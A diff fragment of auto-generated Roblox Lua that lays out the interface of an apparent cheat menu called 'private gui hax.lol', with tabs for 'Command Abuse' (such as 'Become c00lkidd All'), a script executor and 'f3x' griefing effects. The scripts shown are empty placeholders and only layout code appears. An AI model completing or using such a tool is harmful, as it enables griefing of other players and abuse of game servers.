+G2L["20a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["20a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["20a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["20a"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["20a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["20a"]["Text"] = [[BillBoard All]];
+G2L["20a"]["Name"] = [[Button]];
+G2L["20a"]["Position"] = UDim2.new(0.01565, 0, 0.75137, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["20b"] = Instance.new("LocalScript", G2L["20a"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["20c"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["20c"]["TextWrapped"] = true;
+G2L["20c"]["BorderSizePixel"] = 3;
+G2L["20c"]["TextSize"] = 14;
+G2L["20c"]["TextScaled"] = true;
+G2L["20c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["20c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["20c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["20c"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["20c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["20c"]["Text"] = [[Become c00lkidd All]];
+G2L["20c"]["Name"] = [[Button]];
+G2L["20c"]["Position"] = UDim2.new(0.22066, 0, 0.75137, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["20d"] = Instance.new("LocalScript", G2L["20c"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["20e"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["20e"]["TextWrapped"] = true;
+G2L["20e"]["BorderSizePixel"] = 3;
+G2L["20e"]["TextSize"] = 14;
+G2L["20e"]["TextScaled"] = true;
+G2L["20e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["20e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["20e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["20e"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["20e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["20e"]["Text"] = [[Empty]];
+G2L["20e"]["Name"] = [[Button]];
+G2L["20e"]["Position"] = UDim2.new(0.01565, 0, 0.87727, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["20f"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["20f"]["TextWrapped"] = true;
+G2L["20f"]["BorderSizePixel"] = 3;
+G2L["20f"]["TextSize"] = 14;
+G2L["20f"]["TextScaled"] = true;
+G2L["20f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["20f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["20f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["20f"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["20f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["20f"]["Text"] = [[Empty]];
+G2L["20f"]["Name"] = [[Button]];
+G2L["20f"]["Position"] = UDim2.new(0.22066, 0, 0.87727, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.HintBTN
+G2L["210"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["210"]["TextWrapped"] = true;
+G2L["210"]["BorderSizePixel"] = 3;
+G2L["210"]["TextSize"] = 14;
+G2L["210"]["TextScaled"] = true;
+G2L["210"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["210"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["210"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["210"]["Size"] = UDim2.new(0, 106, 0, 26);
+G2L["210"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["210"]["Text"] = [[Hint]];
+G2L["210"]["Name"] = [[HintBTN]];
+G2L["210"]["Position"] = UDim2.new(0.42567, 0, 0.75863, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.HintBTN.LocalScript
+G2L["211"] = Instance.new("LocalScript", G2L["210"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.MessageBTN
+G2L["212"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["212"]["TextWrapped"] = true;
+G2L["212"]["BorderSizePixel"] = 3;
+G2L["212"]["TextSize"] = 14;
+G2L["212"]["TextScaled"] = true;
+G2L["212"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["212"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["212"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["212"]["Size"] = UDim2.new(0, 106, 0, 26);
+G2L["212"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["212"]["Text"] = [[Message]];
+G2L["212"]["Name"] = [[MessageBTN]];
+G2L["212"]["Position"] = UDim2.new(0.4241, 0, 0.87727, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.MessageBTN.LocalScript
+G2L["213"] = Instance.new("LocalScript", G2L["212"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.TextBoxHint
+G2L["214"] = Instance.new("TextBox", G2L["1cd"]);
+G2L["214"]["Name"] = [[TextBoxHint]];
+G2L["214"]["BorderSizePixel"] = 3;
+G2L["214"]["TextWrapped"] = true;
+G2L["214"]["TextSize"] = 14;
+G2L["214"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["214"]["TextScaled"] = true;
+G2L["214"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["214"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["214"]["ClearTextOnFocus"] = false;
+G2L["214"]["PlaceholderText"] = [[-- Text]];
+G2L["214"]["Size"] = UDim2.new(0, 208, 0, 32);
+G2L["214"]["Position"] = UDim2.new(0.64319, 0, 0.75061, 0);
+G2L["214"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["214"]["Text"] = [[]];
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.TextBoxMessage
+G2L["215"] = Instance.new("TextBox", G2L["1cd"]);
+G2L["215"]["Name"] = [[TextBoxMessage]];
+G2L["215"]["BorderSizePixel"] = 3;
+G2L["215"]["TextWrapped"] = true;
+G2L["215"]["TextSize"] = 14;
+G2L["215"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["215"]["TextScaled"] = true;
+G2L["215"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["215"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["215"]["ClearTextOnFocus"] = false;
+G2L["215"]["PlaceholderText"] = [[-- Text]];
+G2L["215"]["Size"] = UDim2.new(0, 208, 0, 32);
+G2L["215"]["Position"] = UDim2.new(0.64319, 0, 0.86925, 0);
+G2L["215"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["215"]["Text"] = [[]];
+
+
+-- StarterGui.private gui hax.lol.Executor tab Page
+G2L["216"] = Instance.new("Frame", G2L["2"]);
+G2L["216"]["Visible"] = false;
+G2L["216"]["BorderSizePixel"] = 3;
+G2L["216"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["216"]["Size"] = UDim2.new(0, 639, 0, 413);
+G2L["216"]["Position"] = UDim2.new(0, 0, 0.18056, 0);
+G2L["216"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["216"]["Name"] = [[Executor tab Page]];
+
+
+-- StarterGui.private gui hax.lol.Executor tab Page.Execute
+G2L["217"] = Instance.new("TextButton", G2L["216"]);
+G2L["217"]["TextWrapped"] = true;
+G2L["217"]["BorderSizePixel"] = 3;
+G2L["217"]["TextSize"] = 14;
+G2L["217"]["TextScaled"] = true;
+G2L["217"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["217"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["217"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["217"]["Size"] = UDim2.new(0, 102, 0, 32);
+G2L["217"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["217"]["Text"] = [[EXECUTE]];
+G2L["217"]["Name"] = [[Execute]];
+G2L["217"]["Position"] = UDim2.new(0.02815, 0, 0.86807, 0);
+
+
+-- StarterGui.private gui hax.lol.Executor tab Page.Execute.LocalScript
+G2L["218"] = Instance.new("LocalScript", G2L["217"]);
+
+
+
+-- StarterGui.private gui hax.lol.Executor tab Page.Clear
+G2L["219"] = Instance.new("TextButton", G2L["216"]);
+G2L["219"]["TextWrapped"] = true;
+G2L["219"]["BorderSizePixel"] = 3;
+G2L["219"]["TextSize"] = 14;
+G2L["219"]["TextScaled"] = true;
+G2L["219"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["219"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["219"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["219"]["Size"] = UDim2.new(0, 102, 0, 32);
+G2L["219"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["219"]["Text"] = [[CLEAR]];
+G2L["219"]["Name"] = [[Clear]];
+G2L["219"]["Position"] = UDim2.new(0.21438, 0, 0.86807, 0);
+
+
+-- StarterGui.private gui hax.lol.Executor tab Page.Clear.LocalScript
+G2L["21a"] = Instance.new("LocalScript", G2L["219"]);
+
+
+
+-- StarterGui.private gui hax.lol.Executor tab Page.btn
+G2L["21b"] = Instance.new("TextButton", G2L["216"]);
+G2L["21b"]["TextWrapped"] = true;
+G2L["21b"]["BorderSizePixel"] = 3;
+G2L["21b"]["TextSize"] = 14;
+G2L["21b"]["TextScaled"] = true;
+G2L["21b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["21b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["21b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["21b"]["Size"] = UDim2.new(0, 64, 0, 37);
+G2L["21b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["21b"]["Text"] = [[Hide: Off]];
+G2L["21b"]["Name"] = [[btn]];
+G2L["21b"]["Position"] = UDim2.new(0.8654, 0, 0.85597, 0);
+
+
+-- StarterGui.private gui hax.lol.Executor tab Page.btn.LocalScript
+G2L["21c"] = Instance.new("LocalScript", G2L["21b"]);
+
+
+
+-- StarterGui.private gui hax.lol.Executor tab Page.Scroll
+G2L["21d"] = Instance.new("ScrollingFrame", G2L["216"]);
+G2L["21d"]["Active"] = true;
+G2L["21d"]["BorderSizePixel"] = 3;
+G2L["21d"]["CanvasSize"] = UDim2.new(0, 0, 20, 0);
+G2L["21d"]["Name"] = [[Scroll]];
+G2L["21d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["21d"]["Size"] = UDim2.new(0, 599, 0, 318);
+G2L["21d"]["Position"] = UDim2.new(0.0266, 0, 0.03874, 0);
+G2L["21d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["21d"]["ScrollBarThickness"] = 3;
+
+
+-- StarterGui.private gui hax.lol.Executor tab Page.Scroll.Source
+G2L["21e"] = Instance.new("TextBox", G2L["21d"]);
+G2L["21e"]["Name"] = [[Source]];
+G2L["21e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["21e"]["PlaceholderColor3"] = Color3.fromRGB(5, 255, 0);
+G2L["21e"]["BorderSizePixel"] = 0;
+G2L["21e"]["TextWrapped"] = true;
+G2L["21e"]["TextSize"] = 18;
+G2L["21e"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
+G2L["21e"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["21e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["21e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["21e"]["MultiLine"] = true;
+G2L["21e"]["ClearTextOnFocus"] = false;
+G2L["21e"]["Size"] = UDim2.new(0, 585, 3, 0);
+G2L["21e"]["Position"] = UDim2.new(0.00165, 0, 0, 0);
+G2L["21e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["21e"]["Text"] = [[print("Hello, World!")]];
+
+
+-- StarterGui.private gui hax.lol.Executor tab Page.censorScript
+G2L["21f"] = Instance.new("ImageLabel", G2L["216"]);
+G2L["21f"]["Interactable"] = false;
+G2L["21f"]["BorderSizePixel"] = 0;
+G2L["21f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["21f"]["Image"] = [[rbxassetid://1243449238]];
+G2L["21f"]["Size"] = UDim2.new(0, 599, 0, 318);
+G2L["21f"]["Visible"] = false;
+G2L["21f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["21f"]["Name"] = [[censorScript]];
+G2L["21f"]["Position"] = UDim2.new(0.0266, 0, 0.03874, 0);
+
+
+-- StarterGui.private gui hax.lol.Dragify
+G2L["220"] = Instance.new("LocalScript", G2L["2"]);
+G2L["220"]["Name"] = [[Dragify]];
+
+
+-- StarterGui.private gui hax.lol.roadblock
+G2L["221"] = Instance.new("ImageLabel", G2L["2"]);
+G2L["221"]["BorderSizePixel"] = 0;
+G2L["221"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["221"]["Image"] = [[rbxassetid://70825617240792]];
+G2L["221"]["Size"] = UDim2.new(0, 74, 0, 67);
+G2L["221"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["221"]["Name"] = [[roadblock]];
+G2L["221"]["Position"] = UDim2.new(-0.12812, 0, 0.29762, 0);
+
+
+-- StarterGui.private gui hax.lol.Skyl0rd
+G2L["222"] = Instance.new("ImageLabel", G2L["2"]);
+G2L["222"]["BorderSizePixel"] = 0;
+G2L["222"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["222"]["Image"] = [[rbxassetid://87085702024755]];
+G2L["222"]["Size"] = UDim2.new(0, 74, 0, 67);
+G2L["222"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["222"]["Name"] = [[Skyl0rd]];
+G2L["222"]["Position"] = UDim2.new(-0.12812, 0, 0.74206, 0);
+
+
+-- StarterGui.private gui hax.lol.Picklelover
+G2L["223"] = Instance.new("ImageLabel", G2L["2"]);
+G2L["223"]["BorderSizePixel"] = 0;
+G2L["223"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["223"]["Image"] = [[rbxassetid://136316186191616]];
+G2L["223"]["Size"] = UDim2.new(0, 74, 0, 67);
+G2L["223"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["223"]["Name"] = [[Picklelover]];
+G2L["223"]["Position"] = UDim2.new(-0.12812, 0, 0.45238, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page
+G2L["224"] = Instance.new("Frame", G2L["2"]);
+G2L["224"]["Visible"] = false;
+G2L["224"]["BorderSizePixel"] = 3;
+G2L["224"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["224"]["Size"] = UDim2.new(0, 639, 0, 413);
+G2L["224"]["Position"] = UDim2.new(0, 0, 0.18056, 0);
+G2L["224"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["224"]["Name"] = [[LocalPlayer tab Page]];
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.TextLabel
+G2L["225"] = Instance.new("TextLabel", G2L["224"]);
+G2L["225"]["TextWrapped"] = true;
+G2L["225"]["BorderSizePixel"] = 3;
+G2L["225"]["TextSize"] = 14;
+G2L["225"]["TextScaled"] = true;
+G2L["225"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["225"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["225"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["225"]["Size"] = UDim2.new(0, 639, 0, 26);
+G2L["225"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["225"]["Text"] = [[cool f3x localplayer script things]];
+G2L["225"]["Position"] = UDim2.new(0.00156, 0, 0.02663, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["226"] = Instance.new("TextButton", G2L["224"]);
+G2L["226"]["TextWrapped"] = true;
+G2L["226"]["BorderSizePixel"] = 3;
+G2L["226"]["TextSize"] = 14;
+G2L["226"]["TextScaled"] = true;
+G2L["226"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["226"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["226"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["226"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["226"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["226"]["Text"] = [[MeshDisco]];
+G2L["226"]["Name"] = [[Button]];
+G2L["226"]["Position"] = UDim2.new(0.0125, 0, 0.12271, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["227"] = Instance.new("LocalScript", G2L["226"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["228"] = Instance.new("TextButton", G2L["224"]);
+G2L["228"]["TextWrapped"] = true;
+G2L["228"]["BorderSizePixel"] = 3;
+G2L["228"]["TextSize"] = 14;
+G2L["228"]["TextScaled"] = true;
+G2L["228"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["228"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["228"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["228"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["228"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["228"]["Text"] = [[HeadShake]];
+G2L["228"]["Name"] = [[Button]];
+G2L["228"]["Position"] = UDim2.new(0.18308, 0, 0.12271, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["229"] = Instance.new("LocalScript", G2L["228"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["22a"] = Instance.new("TextButton", G2L["224"]);
+G2L["22a"]["TextWrapped"] = true;
+G2L["22a"]["BorderSizePixel"] = 3;
+G2L["22a"]["TextSize"] = 14;
+G2L["22a"]["TextScaled"] = true;
+G2L["22a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["22a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["22a"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["22a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["22a"]["Text"] = [[Floating Pad]];
+G2L["22a"]["Name"] = [[Button]];
+G2L["22a"]["Position"] = UDim2.new(0.35366, 0, 0.12271, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["22b"] = Instance.new("LocalScript", G2L["22a"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["22c"] = Instance.new("TextButton", G2L["224"]);
+G2L["22c"]["TextWrapped"] = true;
+G2L["22c"]["BorderSizePixel"] = 3;
+G2L["22c"]["TextSize"] = 14;
+G2L["22c"]["TextScaled"] = true;
+G2L["22c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["22c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["22c"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["22c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["22c"]["Text"] = [[Money Bag]];
+G2L["22c"]["Name"] = [[Button]];
+G2L["22c"]["Position"] = UDim2.new(0.52111, 0, 0.12271, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["22d"] = Instance.new("LocalScript", G2L["22c"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["22e"] = Instance.new("TextButton", G2L["224"]);
+G2L["22e"]["TextWrapped"] = true;
+G2L["22e"]["BorderSizePixel"] = 3;
+G2L["22e"]["TextSize"] = 14;
+G2L["22e"]["TextScaled"] = true;
+G2L["22e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["22e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["22e"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["22e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["22e"]["Text"] = [[Chicken Arms]];
+G2L["22e"]["Name"] = [[Button]];
+G2L["22e"]["Position"] = UDim2.new(0.69169, 0, 0.12271, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["22f"] = Instance.new("LocalScript", G2L["22e"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["230"] = Instance.new("TextButton", G2L["224"]);
+G2L["230"]["TextWrapped"] = true;
+G2L["230"]["BorderSizePixel"] = 3;
+G2L["230"]["TextSize"] = 14;
+G2L["230"]["TextScaled"] = true;
+G2L["230"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["230"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["230"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["230"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["230"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["230"]["Text"] = [[Dev Uzi]];
+G2L["230"]["Name"] = [[Button]];
+G2L["230"]["Position"] = UDim2.new(0.85914, 0, 0.12271, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["231"] = Instance.new("LocalScript", G2L["230"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["232"] = Instance.new("TextButton", G2L["224"]);
+G2L["232"]["TextWrapped"] = true;
+G2L["232"]["BorderSizePixel"] = 3;
+G2L["232"]["TextSize"] = 14;
+G2L["232"]["TextScaled"] = true;
+G2L["232"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["232"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["232"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["232"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["232"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["232"]["Text"] = [[Krystal Dance]];
+G2L["232"]["Name"] = [[Button]];
+G2L["232"]["Position"] = UDim2.new(0.0125, 0, 0.24378, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["233"] = Instance.new("TextButton", G2L["224"]);
+G2L["233"]["TextWrapped"] = true;
+G2L["233"]["BorderSizePixel"] = 3;
+G2L["233"]["TextSize"] = 14;
+G2L["233"]["TextScaled"] = true;
+G2L["233"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["233"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["233"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["233"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["233"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["233"]["Text"] = [[Suicide Gun]];
+G2L["233"]["Name"] = [[Button]];
+G2L["233"]["Position"] = UDim2.new(0.18308, 0, 0.24378, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["234"] = Instance.new("TextButton", G2L["224"]);
+G2L["234"]["TextWrapped"] = true;
+G2L["234"]["BorderSizePixel"] = 3;
+G2L["234"]["TextSize"] = 14;
+G2L["234"]["TextScaled"] = true;
+G2L["234"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["234"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["234"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["234"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["234"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["234"]["Text"] = [[John Doe]];
+G2L["234"]["Name"] = [[Button]];
+G2L["234"]["Position"] = UDim2.new(0.35366, 0, 0.24378, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["235"] = Instance.new("LocalScript", G2L["234"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["236"] = Instance.new("TextButton", G2L["224"]);
+G2L["236"]["TextWrapped"] = true;
+G2L["236"]["BorderSizePixel"] = 3;
+G2L["236"]["TextSize"] = 14;
+G2L["236"]["TextScaled"] = true;
+G2L["236"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["236"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["236"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["236"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["236"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["236"]["Text"] = [[Spawn Parts]];
+G2L["236"]["Name"] = [[Button]];
+G2L["236"]["Position"] = UDim2.new(0.52111, 0, 0.24378, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["237"] = Instance.new("LocalScript", G2L["236"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["238"] = Instance.new("TextButton", G2L["224"]);
+G2L["238"]["TextWrapped"] = true;
+G2L["238"]["BorderSizePixel"] = 3;
+G2L["238"]["TextSize"] = 14;
+G2L["238"]["TextScaled"] = true;
+G2L["238"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["238"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["238"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["238"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["238"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["238"]["Text"] = [[Delete Spawned Parts]];
+G2L["238"]["Name"] = [[Button]];
+G2L["238"]["Position"] = UDim2.new(0.69169, 0, 0.24378, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["239"] = Instance.new("LocalScript", G2L["238"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["23a"] = Instance.new("TextButton", G2L["224"]);
+G2L["23a"]["TextWrapped"] = true;
+G2L["23a"]["BorderSizePixel"] = 3;
+G2L["23a"]["TextSize"] = 14;
+G2L["23a"]["TextScaled"] = true;
+G2L["23a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["23a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["23a"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["23a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
